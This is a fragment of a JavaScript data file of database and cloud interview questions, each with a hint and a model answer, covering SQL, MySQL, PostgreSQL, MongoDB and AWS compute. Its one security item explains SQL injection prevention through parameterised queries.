      { q:'Explain the difference between INNER JOIN, LEFT JOIN, RIGHT JOIN, and FULL OUTER JOIN with examples.', hint:'INNER: matching rows only. LEFT: all left + matched right (NULL if no match). RIGHT: opposite. FULL OUTER: all rows from both.', answer:`An INNER JOIN returns only rows where there is a matching value in both tables - the most restrictive join. A LEFT JOIN returns all rows from the left table and matching rows from the right; if no match exists, right-side columns come back as NULL. This is ideal when you want all records from the primary table regardless of whether a related record exists. A RIGHT JOIN is the mirror image, keeping all rows from the right table. A FULL OUTER JOIN returns all rows from both tables with NULLs wherever no match exists. In practice I use INNER JOIN for strict relational lookups, LEFT JOIN for optional relationships like users who may or may not have placed an order, and FULL OUTER JOIN when reconciling two datasets to identify gaps on either side.` },
      { q:'How would you optimise a SQL query that is running slowly on a table with 10 million rows?', hint:'EXPLAIN/EXPLAIN ANALYZE, add indexes on WHERE/JOIN columns, avoid SELECT *, use LIMIT, avoid functions on indexed columns.', answer:`My first step is always EXPLAIN ANALYZE to see the actual execution plan - it tells me whether the database is doing a sequential scan or using an index, and exactly where the time is being spent. From there I check whether the columns used in WHERE and JOIN clauses have appropriate indexes; a missing index on a high-cardinality column is usually the biggest single win. I also ensure we select only the columns we need rather than SELECT *, since fetching wide rows increases I/O significantly. I watch for anti-patterns like wrapping an indexed column in a function call, which prevents index usage. For large result sets, I use keyset pagination instead of LIMIT/OFFSET to avoid scanning millions of rows. If aggregations are expensive, I evaluate whether materialised views or partial indexes can pre-compute the results. Through these steps I have reduced query times from several seconds to milliseconds in production.` },
      { q:'What is the difference between HAVING and WHERE in SQL?', hint:'WHERE filters rows before grouping. HAVING filters after GROUP BY. You cannot use aggregate functions in WHERE.', answer:`WHERE and HAVING both filter data but at different stages of execution. WHERE is evaluated before GROUP BY, so it filters individual rows based on raw column values - use it to narrow the dataset before grouping happens. HAVING is evaluated after GROUP BY, so it filters resulting groups based on aggregate values like COUNT, SUM, or AVG. A practical example: if I want only orders from the last 30 days grouped by customer, I use WHERE to limit rows to that date range. Then if I want only customers who placed more than five orders in that period, I add HAVING COUNT(*) > 5. Trying to use an aggregate function inside WHERE will throw an error because the groups do not yet exist at that stage. Understanding this distinction helps me write queries that are both correct and efficient.` },
      { q:'Explain database normalisation - what are 1NF, 2NF, and 3NF?', hint:'1NF: atomic values, no repeating groups. 2NF: 1NF + no partial dependencies. 3NF: 2NF + no transitive dependencies.', answer:`Normalisation structures a relational database to reduce redundancy and improve integrity. First Normal Form requires every column to hold atomic, indivisible values with no repeating groups - so instead of storing a comma-separated list of phone numbers in one column, each number gets its own row. Second Normal Form builds on 1NF by requiring every non-key attribute to be fully dependent on the entire primary key, not just part of it - this matters with composite keys where some columns only relate to one part of the key. Third Normal Form eliminates transitive dependencies, meaning non-key columns should not depend on other non-key columns; for instance, storing a city name in an orders table that is derivable from the ZIP code violates 3NF. I normalise to 3NF by default to keep the schema clean and avoid update anomalies, then selectively denormalise only when query performance data justifies it.` },
      { q:'Explain SQL window functions - what can they do that GROUP BY cannot?', hint:'ROW_NUMBER, RANK, DENSE_RANK, LAG, LEAD, SUM OVER PARTITION. Unlike GROUP BY, window functions do not collapse rows - each row retains its identity with an added aggregate value.', answer:`Window functions perform calculations across a set of rows related to the current row without collapsing the result set. GROUP BY collapses multiple rows into one group row - you lose access to individual row data. Window functions retain every row and add a computed value alongside it. ROW_NUMBER() assigns a sequential integer within a partition, perfect for selecting the most recent record per user. RANK() and DENSE_RANK() rank rows within a partition with different tie-handling. LAG(col, n) and LEAD(col, n) access the value n rows before or after the current row in the partition - invaluable for comparing a row to its predecessor, like calculating day-over-day change in a time series. SUM() OVER (PARTITION BY customer_id ORDER BY order_date) computes a running total per customer without losing the individual order rows. Window functions transformed how I write analytical queries - tasks that once required self-joins or subqueries are now a single clean expression.` },
      { q:'What are CTEs (Common Table Expressions) and when would you use a recursive CTE?', hint:'WITH clause defines a named subquery. Recursive CTE references itself to traverse hierarchical data (org charts, category trees, graph paths). Cleaner than nested subqueries.', answer:`A CTE defines a named temporary result set using the WITH clause that can be referenced in the main query. It makes complex queries readable by breaking them into named logical steps rather than deeply nested subqueries. A simple CTE: WITH high_value_orders AS (SELECT * FROM orders WHERE total > 1000) SELECT customer_id, COUNT(*) FROM high_value_orders GROUP BY customer_id. A recursive CTE references itself and is used to traverse hierarchical data: an organisational chart, a category tree, file system paths, or graph shortest-path problems. The recursive form has a base case (the anchor member) and a recursive case that references the CTE itself. The database evaluates the base case, then repeatedly applies the recursive case until no new rows are produced. I use CTEs generously for readability and reach for recursive CTEs specifically when the data is hierarchical with an unknown or variable depth that cannot be queried with a fixed number of JOINs.` },
      { q:'What are SQL transactions and ACID properties? Give a real-world example of each.', hint:'Atomicity: all or nothing. Consistency: valid state before and after. Isolation: concurrent transactions do not interfere. Durability: committed data survives crashes.', answer:`ACID properties define what makes a database transaction reliable. Atomicity: a transaction is all-or-nothing - a bank transfer that debits one account and credits another either completes fully or is fully rolled back; the money cannot vanish or duplicate. Consistency: a transaction can only bring the database from one valid state to another valid state, respecting all integrity constraints. Isolation: concurrent transactions behave as if they ran serially - two users booking the last seat on a flight cannot both succeed because isolation prevents them from both reading "one seat available" before either commits. Durability: once a transaction commits, the data survives even if the server crashes immediately after - the write is persisted to disk. In SQL, I use transactions explicitly with BEGIN/COMMIT when multiple related operations must succeed or fail together. I also consider isolation levels - READ COMMITTED, REPEATABLE READ, SERIALIZABLE - trading concurrency against consistency depending on the workload.` },
      { q:'Explain composite and covering indexes. How do they differ from a single-column index?', hint:'Composite: index on multiple columns, column order matters (leftmost prefix rule). Covering: index includes all columns needed by the query - no table lookup required.', answer:`A composite index covers multiple columns in a specific order. The leftmost prefix rule means a composite index on (last_name, first_name, email) supports queries filtering on last_name alone, on last_name + first_name, or all three - but not on first_name alone or email alone. Column order should reflect the most common query patterns, placing equality conditions before range conditions. A covering index is a composite index that includes all columns a query needs - both the filter columns and the selected columns - so the database can answer the query entirely from the index without reading the actual table rows. This eliminates the table lookup step and dramatically improves performance for read-heavy queries. Example: an index on (user_id, created_at, status) covers SELECT status FROM orders WHERE user_id = 5 ORDER BY created_at - all three needed columns are in the index. The tradeoff is that wider indexes cost more on write operations and consume more storage.` },
      { q:'When would you use a subquery versus a JOIN versus a CTE for the same problem?', hint:'JOIN: combining tables. Subquery: filtering based on aggregate result. CTE: readability and reuse. Performance varies - check EXPLAIN. Correlated subqueries are expensive.', answer:`All three can solve many of the same problems, so I choose based on readability, reuse, and performance. JOINs are my default for combining data from multiple tables - they are clear, standard, and well-optimised by query planners. Subqueries in WHERE clauses are natural for filtering based on aggregate conditions: DELETE FROM sessions WHERE user_id IN (SELECT id FROM users WHERE banned = true). Correlated subqueries - where the inner query references the outer query - are generally slow because they re-execute per row; I convert them to JOINs or window functions whenever possible. CTEs shine when a result set is referenced multiple times in the same query, or when breaking a complex query into named steps significantly improves readability. Most modern query planners materialise CTEs or inline them based on cost estimates, so the performance difference versus equivalent subqueries is often small. I always check EXPLAIN ANALYZE when a query performs unexpectedly - the planner sometimes surprises you.` },
    ],
    mysql: [
      { q:'What is the difference between MyISAM and InnoDB storage engines in MySQL?', hint:'InnoDB: ACID-compliant, foreign keys, row-level locking, MVCC. MyISAM: faster reads, table-level locking, no transactions.', answer:`InnoDB is the default and the right choice for almost all production use cases. It is fully ACID-compliant, supports foreign keys with cascading updates and deletes, uses row-level locking for high concurrency, and implements MVCC so readers do not block writers. MyISAM predates these features - it offers slightly faster read performance on simple queries and smaller storage overhead because it lacks the transaction log, but it uses table-level locking, has no transaction support, and can corrupt data on a crash since there is no crash recovery. I would only consider MyISAM today for read-only or analytics tables with no concurrent writes and no need for transactions or referential integrity - in practice, even then, InnoDB with appropriate indexes typically matches or exceeds MyISAM read performance while offering far better reliability.` },
      { q:'How do you prevent SQL injection in your applications?', hint:'Parameterised queries / prepared statements. Never concatenate user input into SQL strings. ORMs handle this by default.', answer:`SQL injection is entirely preventable with one practice: never concatenate user input directly into SQL strings. Instead, always use parameterised queries or prepared statements, where the SQL structure is fixed and user input is passed as separate parameters that the database driver escapes and quotes correctly. In Node.js with pg, this looks like client.query('SELECT * FROM users WHERE id = $1', [userId]) - the database treats userId as a value, not SQL syntax, regardless of what it contains. ORMs like Sequelize, TypeORM, and Prisma use parameterised queries internally for all standard operations, so you get injection protection by default. The only risky area is raw queries - even in ORMs, I am careful to parameterise user-supplied values in raw SQL fragments. I also validate input at the application layer and apply least-privilege database credentials as a second line of defence.` },
      { q:'Explain MySQL indexing - what types of indexes exist and how does the query optimiser use them?', hint:'B-tree (default), Hash (MEMORY tables), Full-text, Spatial. Composite indexes follow leftmost prefix. Cardinality matters. EXPLAIN shows which index is used.', answer:`MySQL uses B-tree indexes by default for most storage engines - they support equality, range, and prefix queries efficiently. Hash indexes are available in MEMORY tables and provide O(1) equality lookups but cannot serve range queries. Full-text indexes support natural language text search with MATCH AGAINST. The query optimiser decides whether to use an index based on cardinality - a column with very low cardinality (like a boolean) may not benefit from an index because scanning the whole table costs less than a partial index scan. Composite indexes follow the leftmost prefix rule: an index on (a, b, c) is usable for queries filtering on a, on a+b, or on a+b+c, but not on b alone. EXPLAIN shows the actual execution plan - type=ALL means a full table scan; type=ref or type=range means an index is being used. I regularly run EXPLAIN on slow queries in production and use the slow query log to identify candidates for indexing.` },
      { q:'What is the difference between CHAR, VARCHAR, and TEXT in MySQL? How do you choose?', hint:'CHAR: fixed-length, padded. VARCHAR: variable-length with length limit, stored inline. TEXT: large variable text, stored off-page. CHAR fastest for fixed data (hashes, codes).', answer:`CHAR(n) allocates exactly n bytes for every value, padding shorter values with spaces. This makes it slightly faster for fixed-length data like country codes, UUIDs, or hash values because MySQL can calculate any row's offset without scanning variable-length fields. VARCHAR(n) stores the actual string length plus a 1-2 byte length prefix, saving space for variable-length data. It is the right choice for names, emails, and most string fields where values vary in length. TEXT stores large blocks of text and is handled differently internally - values above a threshold are stored off-page (in separate pages), which means accessing a TEXT column may require an additional read. TEXT columns cannot be indexed fully (only a prefix can be indexed), and they cannot have DEFAULT values in older MySQL versions. I use VARCHAR for fields under 65,535 bytes where I might need full indexing, and TEXT for long-form content like article bodies, comments, or logs where indexing is not needed.` },
      { q:'How does MySQL replication work and what are the differences between row-based and statement-based replication?', hint:'Primary writes to binary log. Replica reads binlog and replays. SBR: logs SQL statements (compact). RBR: logs actual row changes (safe for non-deterministic queries).', answer:`MySQL replication streams changes from a primary to one or more replicas via the binary log. The primary writes every committed change to the binlog; each replica has an I/O thread that reads the binlog and an SQL thread that applies the changes. This creates eventual consistency - replicas may lag behind the primary by milliseconds to seconds depending on write volume. Statement-based replication logs the SQL statements themselves, which is compact but can produce inconsistent results for non-deterministic queries like NOW() or RAND() - the result depends on when the statement runs, which may differ on the replica. Row-based replication logs the actual before and after values of changed rows - always deterministic and safer but more verbose for bulk operations. Mixed replication uses statement-based by default and switches to row-based for non-deterministic queries automatically. I use row-based replication for production because correctness matters more than binlog size.` },
      { q:'What are MySQL transactions and how do you handle distributed transaction scenarios?', hint:'BEGIN/COMMIT/ROLLBACK. Isolation levels: READ UNCOMMITTED, READ COMMITTED, REPEATABLE READ (default), SERIALIZABLE. Distributed: two-phase commit or saga pattern.', answer:`MySQL InnoDB transactions provide ACID guarantees with four isolation levels. The default REPEATABLE READ means a transaction always sees the same snapshot - rows read at the start are consistent throughout, preventing phantom reads in most cases. READ COMMITTED allows a transaction to see changes committed by other transactions during its execution - more concurrent but susceptible to non-repeatable reads. SERIALIZABLE is the strictest - fully serialised, suitable for financial accuracy requirements, but heavily impacts concurrency. For distributed transactions spanning multiple databases or services, MySQL's native two-phase commit exists but adds significant complexity and performance overhead. In microservices I use the Saga pattern instead: a sequence of local transactions each publishing an event; if a step fails, compensating transactions roll back previous steps. This avoids distributed locks while providing eventual consistency. For strong consistency in critical financial transactions, I prefer keeping all related data in a single database and using local transactions rather than distributed coordination.` },
      { q:'How do you optimise MySQL for high write throughput?', hint:'InnoDB buffer pool sizing, innodb_flush_log_at_trx_commit=2 for non-critical, batch inserts, avoid indexes on write-heavy tables, partitioning.', answer:`High write throughput optimisation starts with InnoDB configuration. The buffer pool is the most impactful setting - it should be 70-80% of available RAM so hot data and indexes are in memory. innodb_flush_log_at_trx_commit controls durability vs performance: value 1 (default) flushes to disk on every commit for full ACID durability; value 2 flushes every second, risking at most one second of data loss in a crash but roughly doubling write throughput. For bulk loading, I disable foreign key checks and unique key checks, use LOAD DATA INFILE instead of row-by-row INSERT, and wrap operations in explicit transactions. Every index on a table adds write overhead - I audit indexes on write-heavy tables and drop those not used by any important query. Partitioning distributes write load and makes bulk deletes of old data faster (DROP PARTITION vs DELETE). For extreme write workloads, I consider sharding or a write-optimised engine like TokuDB, or moving write-heavy data to a streaming system like Kafka before batch-writing to MySQL.` },
      { q:'How do you monitor and debug MySQL performance in production?', hint:'Slow query log, INFORMATION_SCHEMA, PERFORMANCE_SCHEMA, EXPLAIN ANALYZE. pt-query-digest for aggregating slow queries. Watch for long-running transactions and lock waits.', answer:`Production MySQL monitoring requires several layers. The slow query log with long_query_time = 1 captures queries exceeding a threshold - pt-query-digest aggregates these into ranked summaries, showing which query patterns consume the most time and how often they run. EXPLAIN and EXPLAIN ANALYZE on slow queries reveal the execution plan: I look for type=ALL (full table scans), high rows values, and filesort or temporary table in the Extra column. PERFORMANCE_SCHEMA provides granular instrumentation: I query it for top waits (lock waits are often the culprit during slow periods), current running transactions, and per-thread memory usage. SHOW ENGINE INNODB STATUS shows lock waits, transaction history, and buffer pool utilisation in detail. For monitoring over time, I collect MySQL metrics - Queries Per Second, slow queries, InnoDB buffer pool hit rate, replication lag, connection count - into a time series database (Prometheus with mysqld_exporter) and alert on anomalies. Long-running transactions are a specific concern: they prevent InnoDB from cleaning up old row versions, causing the undo log to grow and slowing all queries.` },
    ],
    postgresql: [
      { q:'What are PostgreSQL-specific features you find most useful that are not in standard SQL?', hint:'JSONB, CTEs (WITH), window functions, LATERAL joins, array types, full-text search, partial indexes, LISTEN/NOTIFY.', answer:`The PostgreSQL features I reach for most in production are JSONB, window functions, and partial indexes. JSONB lets me store semi-structured data with full indexing support - I use it for flexible metadata fields that would otherwise require many nullable columns or a separate key-value table. Window functions like ROW_NUMBER(), RANK(), and LAG() allow sophisticated analytics without subqueries - ranking results within groups, calculating running totals, or comparing a row to the previous row. Partial indexes index only rows matching a condition, dramatically reducing index size and write overhead for queries on subsets of data like status = 'active'. CTEs with WITH make complex multi-step queries readable. LISTEN/NOTIFY provides a lightweight pub/sub mechanism that I use to push real-time database change events to application servers. These features together let PostgreSQL handle use cases that would otherwise require separate specialised tools.` },
      { q:'Explain MVCC in PostgreSQL - how does it handle concurrent read/write access?', hint:'Each transaction sees a snapshot of the database. Rows have xmin/xmax transaction IDs. Old versions cleaned by VACUUM.', answer:`MVCC - Multi-Version Concurrency Control - is how PostgreSQL allows readers and writers to operate concurrently without blocking each other. Every row in PostgreSQL carries two transaction ID fields: xmin (the transaction that created it) and xmax (the transaction that deleted or updated it). When a transaction reads data, it sees a consistent snapshot of all rows whose xmin is less than its transaction ID and whose xmax is either zero or higher than its transaction ID - meaning the row existed when the transaction started. A writer creating an updated row does not overwrite the old version; it marks the old row's xmax and inserts a new row version. This means readers never block writers and writers never block readers. The tradeoff is that old row versions accumulate and must be cleaned up. That is VACUUM's job - it reclaims space from dead tuples that are no longer visible to any active transaction.` },
      { q:'What are PostgreSQL indexes beyond B-tree? When would you use GIN, GiST, and BRIN?', hint:'GIN: full-text search, arrays, JSONB containment. GiST: geometric types, range types, nearest-neighbour. BRIN: time-series with sequential disk order. Much smaller than B-tree.', answer:`PostgreSQL offers several index types beyond the default B-tree, each optimised for specific data access patterns. GIN - Generalised Inverted Index - is designed for composite values where you query for elements within them: full-text search tsvectors, array containment (@> and <@ operators), and JSONB key existence. GIN indexes the individual elements of composite values rather than the whole value. GiST - Generalised Search Tree - is an extensible index framework for complex types: geometric shapes, range types, and nearest-neighbour searches. PostGIS uses GiST for spatial queries. BRIN - Block Range INdex - stores the minimum and maximum values for ranges of physically adjacent blocks. It is tiny (a fraction of B-tree size) and extremely fast for naturally ordered data like timestamps in a time-series table where recent data has the highest block numbers. For a 10-billion-row sensor data table, a BRIN index on timestamp is often faster and thousands of times smaller than a B-tree. I choose the index type by matching the query operator to the index's strengths.` },
      { q:'How do you perform a zero-downtime schema migration in PostgreSQL?', hint:'Add columns as nullable, backfill in batches, add constraints in separate steps. Avoid long-held locks. Tools: pg_repack for table bloat, strong_migrations gem for Rails.', answer:`Online schema changes in PostgreSQL require avoiding long-held ACCESS EXCLUSIVE locks that block all reads and writes. Adding a NOT NULL column with a default in PostgreSQL 11+ is instant because the default is stored as table metadata rather than rewriting every row. In older versions, I add the column as nullable, backfill it in batches with UPDATE limiting rows processed per transaction to avoid lock escalation and replication lag, then add the NOT NULL constraint. Adding an index uses CREATE INDEX CONCURRENTLY, which builds the index without holding a table lock - it is slower but non-blocking. Renaming a column or table requires a lock and a code deploy in perfect synchrony - I avoid column renames by adding a new column, migrating data, deploying code that reads from both, then dropping the old column in a later release. Tools like strong_migrations (Rails) or squawk detect dangerous migration patterns before they run. I always test migrations against a production-size data copy to measure actual lock duration.` },
      { q:'Explain the differences between PostgreSQL replication approaches: streaming, logical, and file-based.', hint:'Physical/streaming: binary WAL stream to replica. Logical: row-level changes decoded from WAL, cross-version. File-based: archived WAL segments, higher lag. Each has different use cases.', answer:`PostgreSQL offers three replication approaches with different tradeoffs. Physical streaming replication transmits the WAL byte stream to replicas, which apply it at the storage level. Replicas are byte-for-byte identical copies of the primary, with sub-second lag possible in synchronous mode. The limitation is replicas must run the same PostgreSQL version and are read-only. File-based replication archives WAL segments to a file store (S3) and replicas restore from them - higher lag but useful for point-in-time recovery and cross-region backup. Logical replication decodes WAL changes into row-level operations (INSERT, UPDATE, DELETE) and transmits them. This allows cross-version replication, replicating specific tables rather than the full database, replicating to non-PostgreSQL targets, and subscribing to changes with custom consumers via pgoutput or pglogical. I use streaming replication for high-availability read replicas and failover, and logical replication for zero-downtime major version upgrades, cross-database synchronisation, and change data capture pipelines feeding data warehouses.` },
      { q:'What is connection pooling in PostgreSQL and why does it matter?', hint:'PostgreSQL creates one process per connection - expensive. PgBouncer pools connections between application and database. Transaction mode for stateless, Session mode for prepared statements.', answer:`PostgreSQL spawns a separate backend process for each connection, each consuming roughly 5-10MB of memory. A database instance with 500 active connections consumes several gigabytes just for connection overhead, and creating new connections takes 10-50ms. Applications often need many more concurrent connections than PostgreSQL can efficiently handle. PgBouncer is the standard connection pooler: it maintains a small pool of actual PostgreSQL connections and multiplexes many application connections through them. Transaction mode (the most efficient) assigns a server connection only for the duration of each transaction, making it ideal for stateless request handlers. Session mode holds the server connection for the application connection's lifetime, required for session-level features like prepared statements, advisory locks, and temporary tables. I deploy PgBouncer as a sidecar in Kubernetes or as a standalone service, typically sizing the pool at 10-20% of the database's max_connections and keeping application-side pool sizes modest.` },
      { q:'How do you back up and restore PostgreSQL databases? What is point-in-time recovery?', hint:'pg_dump for logical backups. pg_basebackup for physical. WAL archiving enables PITR. Regularly test restores - a backup you have never tested is not a backup.', answer:`PostgreSQL provides two backup approaches. Logical backups with pg_dump export data as SQL or binary format - portable across versions, selective (single table or schema), but slow for large databases and capturing a consistent snapshot requires locking. pg_dump --format=custom produces a compressed binary format that pg_restore can restore selectively with --table or --schema. Physical backups with pg_basebackup create a filesystem-level copy of the data directory - fast and complete, but tied to the PostgreSQL version and platform. Point-in-time recovery (PITR) combines a physical base backup with WAL archiving: archive WAL segments continuously to S3 or a file store, and in a recovery scenario, restore the base backup and replay WAL up to any specific transaction ID or timestamp. This allows recovery to any moment before the failure, not just to the last scheduled backup. I test backups by running a full restore to a separate environment quarterly - testing the restore process is as important as taking backups, because an untested restore might fail when it matters most.` },
      { q:'What are PostgreSQL row-level security policies and when would you use them?', hint:'RLS enforces access control at the database level. Tables have policies controlling which rows a user can SELECT/INSERT/UPDATE/DELETE. Useful for multi-tenant data isolation.', answer:`Row-level security policies restrict which rows a database user can access within a table, enforcing data isolation at the storage layer rather than the application layer. This is particularly powerful for multi-tenant applications where all tenants share the same tables: a policy on the orders table that checks current_setting('app.current_tenant_id') = tenant_id means a tenant's application connection can only ever see their own rows, even if the application code has a bug that would otherwise expose another tenant's data. Policies are SQL expressions evaluated for each row: CREATE POLICY tenant_isolation ON orders USING (tenant_id = current_setting('app.current_tenant_id')::uuid). RLS must be explicitly enabled per table (ALTER TABLE orders ENABLE ROW LEVEL SECURITY), and superusers bypass it by default. I use RLS in multi-tenant SaaS applications as an additional security layer - not a replacement for application-level checks, but a defence-in-depth mechanism that ensures data isolation even when application logic fails.` },
    ],
    mongodb: [
      { q:'When would you choose MongoDB over a relational database, and what are the tradeoffs?', hint:'MongoDB: flexible schema, horizontal scaling, document model suits nested/variable data. RDBMS: complex queries, strong consistency, joins.', answer:`I choose MongoDB when the data is naturally document-shaped - objects with nested arrays and sub-documents that would require multiple joined tables in a relational model - and when the schema evolves frequently because different records legitimately have different fields. A product catalogue with highly variable attributes per category is a good fit. MongoDB's horizontal sharding scales writes across many nodes, making it well-suited for write-heavy workloads at scale. The tradeoffs are real: MongoDB does not support multi-document ACID transactions as naturally as PostgreSQL (though they are available since 4.0), lacks the query power of window functions and complex joins, and historically had weaker consistency guarantees. For anything with complex relational data, strict consistency requirements, or heavy analytical queries, a relational database is still the right tool. I choose the database to fit the data model, not the other way around.` },
      { q:'Explain MongoDB aggregation pipeline and give an example of a complex query you have written.', hint:'Stages: $match, $group, $project, $sort, $lookup (join), $unwind. Each stage transforms documents passing through.', answer:`The aggregation pipeline processes documents through a sequence of stages, each transforming the output of the previous one. $match filters documents early - always put it first to reduce the working set. $group aggregates, similar to GROUP BY in SQL. $project reshapes documents, including or excluding fields. $sort orders results. $lookup performs a left outer join to another collection. $unwind deconstructs array fields into individual documents. A real example: I built a reporting query that started with $match to filter orders by date range, then $lookup to join with a users collection, $unwind to flatten the joined array, $group by userId to sum total spend, $sort by total descending, and $project to return only the fields the dashboard needed. The pipeline approach is composable and readable - each stage has a clear, single responsibility.` },
      { q:'How do you design indexes in MongoDB for read-heavy vs write-heavy workloads?', hint:'Compound indexes for common query patterns, sparse indexes, TTL indexes for expiry. Indexes slow writes - balance carefully.', answer:`For read-heavy workloads, I build indexes around the queries: compound indexes on the fields used in the query filter in the order they are most selective, following the ESR rule - Equality fields first, Sort fields second, Range fields last. I use covered queries where possible - including projected fields in the index so MongoDB can serve the query entirely from the index without reading documents. For write-heavy workloads, every additional index adds overhead to inserts, updates, and deletes, so I audit with explain() to confirm each index is actually used, and drop unused ones. Sparse indexes index only documents where the field exists, saving space for optional fields. TTL indexes automatically expire documents after a time period - I use them for sessions, logs, and cache collections to avoid manual cleanup jobs. The right balance is the minimum set of indexes that makes your critical query paths fast without crippling write throughput.` },
      { q:'How do you model relationships in MongoDB - when do you embed versus reference?', hint:'Embed: owned data, always queried together, bounded size. Reference: shared data, many-to-many, unbounded arrays. 16MB document limit matters.', answer:`Embedding puts related data directly inside a parent document. It is the right choice when the related data is exclusively owned by the parent, always queried together with it, and bounded in size - embedding an address inside a user document or an array of items inside an order. A single read returns the full object with no extra round trips. Referencing stores the related document separately and stores only its _id in the parent, similar to a foreign key. I reference when data is shared across many parents (a category referenced by thousands of products), when the embedded array could grow unboundedly (a post with potentially millions of comments), or when the related data is rarely accessed with the parent and embedding would waste bandwidth. MongoDB's 16MB document size limit is a hard boundary for embedded arrays. The general rule: embed when you always access data together; reference when you access it independently or the relationship is many-to-many. Hybrid approaches are common - embed the most recent five comments, reference the rest.` },
      { q:'How do MongoDB replica sets work, and what happens during a primary failover?', hint:'Primary handles writes. Secondaries replicate oplog async. Election on primary loss - majority vote, ~10-30s. Minimum 3 nodes recommended. Use replica set connection string.', answer:`A replica set consists of one primary and one or more secondaries. The primary handles all writes; secondaries asynchronously replicate changes by tailing the primary's oplog (operation log), applying operations in the same order. Read preference settings can direct reads to secondaries for read-heavy workloads, accepting potential staleness. If the primary becomes unreachable - network partition or crash - secondaries hold an automatic election. Each eligible secondary votes, and the first node to receive a majority becomes the new primary. Elections typically complete in 10-30 seconds; writes are unavailable during this window. Applications using a replica set connection string (not a single-node string) automatically reconnect to the new primary. Three nodes is the minimum recommended deployment - one primary, two secondaries - so that a majority (two of three) can always elect a new primary even if one node fails. Arbiter nodes vote in elections without storing data, useful for maintaining odd quorum in cost-sensitive deployments.` },
      { q:'What are MongoDB multi-document transactions and when should you use them?', hint:'ACID transactions since MongoDB 4.0 (replica sets), 4.2 (sharded). Use only when multi-document atomicity is genuinely required. Design schema first to avoid need - single-document writes are always atomic and cheaper.', answer:`MongoDB introduced ACID multi-document transactions in version 4.0 for replica sets and extended them to sharded clusters in 4.2. Within a session, operations across multiple documents and collections either all commit or all roll back - the same semantics as a relational transaction. I use transactions when an operation genuinely requires atomicity across multiple documents: transferring funds between two account documents, creating an order while simultaneously updating inventory, or writing related data to multiple collections where partial writes would corrupt application state. The important caveat is performance: transactions carry significant overhead compared to single-document writes. MongoDB's document model is intentionally designed so that a single document write is atomic without transactions - if the schema is designed well, most operations fit in one document. Before reaching for transactions, I ask whether a schema redesign eliminates the need. Use transactions as a tool for genuinely multi-entity atomic operations, not as a substitute for relational design.` },
      { q:'How do you diagnose and fix slow queries in MongoDB?', hint:'explain("executionStats"): IXSCAN vs COLLSCAN. db.setProfilingLevel(1) for slow query log. Atlas Performance Advisor. db.currentOp() to see running ops. COLLSCAN on large collections = missing index.', answer:`My first tool is explain("executionStats"): db.collection.explain("executionStats").find({...}) shows the winning plan and key metrics - the stage type (IXSCAN means an index was used, COLLSCAN means a full collection scan), nReturned (documents returned), and totalDocsExamined (documents scanned). A healthy query has nReturned close to totalDocsExamined; a high examined-to-returned ratio indicates a missing or inappropriate index. The MongoDB slow query profiler captures all operations exceeding a threshold: db.setProfilingLevel(1, { slowms: 100 }) writes slow operations to the system.profile collection, which I query to find production bottlenecks. In Atlas, the Performance Advisor automatically identifies slow queries and recommends indexes. db.currentOp() shows currently executing operations in real time - useful for identifying a long-running aggregation that is causing resource contention. I use db.killOp(opId) to terminate a runaway query. After adding an index, I re-run explain to confirm the plan changed from COLLSCAN to IXSCAN and that the execution time dropped.` },
      { q:'What are MongoDB change streams and how do you implement real-time notifications with them?', hint:'Watch collection/database/cluster changes (insert/update/delete). Built on oplog. Resume token for fault tolerance. Requires replica set. Use in worker service for cache invalidation or CDC.', answer:`Change streams provide a real-time feed of document changes - inserts, updates, deletes, and replacements - in a collection, database, or entire cluster. They are built on MongoDB's oplog and exposed as a resumable cursor. Each event contains the full document after the change, the operation type, and a resume token. I use change streams for cache invalidation (when an order document updates, invalidate its Redis cache entry), real-time notifications to connected clients via WebSocket or SSE, and change data capture pipelines feeding changes into Elasticsearch or a data warehouse. The resume token is critical for fault tolerance: if the change stream consumer disconnects, it stores the last processed token, then resumes from that exact point on reconnect - ensuring no events are missed. Change streams require a replica set or sharded cluster, not a standalone instance. I run change stream processing in a dedicated worker service to avoid blocking the main application thread and handle backpressure explicitly.` },
      { q:'What MongoDB security practices do you follow in production?', hint:'Authentication required (SCRAM-SHA-256). RBAC: grant only needed permissions. TLS for transport. Encryption at rest. Never expose to public internet - VPC isolation. Audit logging.', answer:`Production MongoDB security is layered. Authentication: I always enable --auth so every connection requires credentials. SCRAM-SHA-256 is the default mechanism for user authentication; x.509 certificates authenticate inter-cluster members in replica sets. Authorization uses MongoDB's built-in RBAC: each application user has the minimum required roles - a read-only analytics user gets readAnyDatabase with no write access; the application user gets readWrite only on its own database; no user has dbAdmin privileges except the DBA account. Transport encryption: --tls with tlsMode: requireTLS rejects all unencrypted connections. Encryption at rest is provided by WiredTiger's encrypted storage engine (MongoDB Enterprise) or Atlas's built-in encryption with customer key management via AWS KMS, Azure Key Vault, or GCP KMS. Network isolation: MongoDB never runs in a public subnet - it is deployed in a private VPC subnet with security groups allowing access only from the application tier. Audit logging captures authentication events, user management changes, and privilege escalations for compliance.` },
      { q:'How do you use the MongoDB $lookup aggregation stage? What are its limitations?', hint:'$lookup: LEFT OUTER JOIN to another collection. from, localField, foreignField, as. Cannot join across shards freely. Add index on foreignField. Use $unwind to flatten results.', answer:`The $lookup stage performs a left outer join to another collection in the same database. Required fields: from (the target collection), localField (field in current documents), foreignField (field in the target collection), and as (output array field name). The joined documents appear as an array - I follow $lookup with $unwind to flatten to individual documents when expecting a one-to-one match. Critically, always add an index on the foreignField: without one, $lookup performs a collection scan on the target for each input document, turning a join into O(nÃ—m). I also put $match before $lookup to reduce the working set before the join executes. Key limitations: $lookup cannot freely join across sharded collections in different shards - the lookup target must be unsharded or on the same shard as the source. For very large joins, $lookup can be slower than the equivalent aggregation done in application code with DataLoader-style batching. When I see $lookup in a hot path, I evaluate whether the schema should embed the frequently joined data instead.` },
    ],
    aws: [
      { q:'Explain the difference between EC2, Lambda, ECS, and EKS. When would you choose each?', hint:'EC2: full control, long-running. Lambda: event-driven, short bursts. ECS: managed containers. EKS: Kubernetes for complex orchestration.', answer:`I match the compute choice to the workload characteristics. EC2 is my choice when I need full OS control, specific hardware, or long-running processes that would be costly to run as Lambda - for example, a machine learning inference server with a GPU. Lambda is ideal for event-driven, short-burst workloads: processing S3 uploads, handling API gateway requests, responding to SQS messages. Its pay-per-invocation model and zero administration make it excellent for unpredictable or spiky traffic. ECS manages Docker containers without requiring Kubernetes expertise - Fargate mode eliminates server management entirely, which is the right tradeoff for most teams not deep in the Kubernetes ecosystem. EKS is for teams that need Kubernetes specifically - complex microservices with sophisticated scheduling, custom operators, or existing Kubernetes tooling. I would not recommend EKS unless the team already has Kubernetes expertise or the complexity genuinely justifies it.` },
